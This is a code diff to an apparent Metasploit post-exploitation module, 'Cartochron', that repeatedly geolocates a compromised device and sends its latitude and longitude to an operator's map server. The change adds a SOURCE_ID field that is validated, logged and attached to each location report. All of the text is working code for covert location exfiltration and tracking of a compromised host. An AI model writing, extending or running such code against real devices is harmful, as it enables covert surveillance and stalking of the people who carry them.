@@ -25,7 +25,8 @@ class MetasploitModule < Msf::Post
       OptString.new('API_KEY', [false, 'API key for wlan_geolocate fallback (if required)', '']),
       OptString.new('MAP_USER', [false, 'HTTP Basic username for the map server', '']),
       OptString.new('MAP_PASSWORD', [false, 'HTTP Basic password for the map server', '']),
-      OptString.new('TRACK_ID', [false, 'Recording-run ID (generated for each job if omitted)', ''])
+      OptString.new('TRACK_ID', [false, 'Recording-run ID (generated for each job if omitted)', '']),
+      OptString.new('SOURCE_ID', [false, 'Operator-enrolled Cartochron source ID (not a device fingerprint)', ''])
     ])
   end
 
@@ -41,6 +42,7 @@ class MetasploitModule < Msf::Post
     map_user = datastore['MAP_USER'].to_s
     map_password = datastore['MAP_PASSWORD'].to_s
     track_id = datastore['TRACK_ID'].to_s
+    source_id = datastore['SOURCE_ID'].to_s
     track_id = SecureRandom.uuid if track_id.empty?
     uri = URI.parse(endpoint)
     unless uri.is_a?(URI::HTTP) && uri.host && !uri.userinfo
@@ -57,10 +59,15 @@ class MetasploitModule < Msf::Post
       return
     end
 
+    unless source_id.empty? || /\Asrc_[0-9a-f]{24}\z/.match?(source_id)
+      print_error('SOURCE_ID must be an enrolled Cartochron src_ identifier')
+      return
+    end
+
     counts = { accepted: 0, rejected: 0, unavailable: 0, errors: 0 }
     previous = nil
     last_report = Process.clock_gettime(Process::CLOCK_MONOTONIC)
-    ilog("[Cartochron] Started run=#{track_id} destination=#{uri.scheme}://#{uri.host}:#{uri.port} interval=#{interval}s")
+    ilog("[Cartochron] Started run=#{track_id} source=#{source_id.empty? ? 'unassigned' : source_id} destination=#{uri.scheme}://#{uri.host}:#{uri.port} interval=#{interval}s")
 
     loop do
       outcome = :unavailable
@@ -86,7 +93,8 @@ class MetasploitModule < Msf::Post
           lon = loc['long'] || loc[:long] || loc['lon'] || loc[:lon]
 
           if lat && lon && lat.to_f != 0.0 && lon.to_f != 0.0
-            response = submit_position(uri, lat.to_f, lon.to_f, map_user, map_password, track_id)
+            response = submit_position(uri, lat.to_f, lon.to_f, map_user, map_password,
+                                       track_id, source_id.empty? ? nil : source_id)
             if response.is_a?(Net::HTTPSuccess)
               outcome = :accepted
               dlog("[Cartochron] Observation accepted run=#{track_id}", 'core', 2)
@@ -138,7 +146,7 @@ class MetasploitModule < Msf::Post
       "unavailable=#{counts[:unavailable]} errors=#{counts[:errors]}"
   end
 
-  def submit_position(uri, lat, lon, username, password, track_id = nil)
+  def submit_position(uri, lat, lon, username, password, track_id = nil, source_id = nil)
     http = Net::HTTP.new(uri.host, uri.port)
     http.use_ssl = uri.scheme == 'https'
     http.open_timeout = 5
@@ -148,6 +156,7 @@ class MetasploitModule < Msf::Post
     request.basic_auth(username, password) unless username.empty?
     observation = { lat: lat, lon: lon }
     observation[:track_id] = track_id if track_id
+    observation[:source_id] = source_id if source_id
     request.body = observation.to_json
     http.request(request)
   end
